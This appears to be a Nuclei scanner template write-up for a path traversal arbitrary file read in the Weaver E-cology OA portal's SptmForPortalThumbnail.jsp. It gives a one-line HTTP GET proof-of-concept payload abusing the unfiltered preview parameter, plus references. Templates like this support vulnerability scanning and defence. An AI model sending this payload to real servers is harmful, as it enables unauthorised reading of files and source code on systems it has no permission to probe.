# Nuclei Template: OA E-Weaver SptmForPortalThumbnail - Arbitrary File Read
**Template ID:** weaver-sptmforportalthumbnail-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`weaver-sptmforportalthumbnail-lfi.yaml`)

## Vulnerability Information & PoC

## Description
The controllable preview parameters of SptmForPortalThumbnail.jsp are not filtered and are directly spliced to the web root directory for file downloading.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp
```

## References
- http://124.223.89.192/archives/e-cology8-14
- https://github.com/GREENHAT7/pxplan/blob/main/xray_pocs/yaml-poc-weaver-weaver_e_cology_oa-readfile-CT-479157.yml
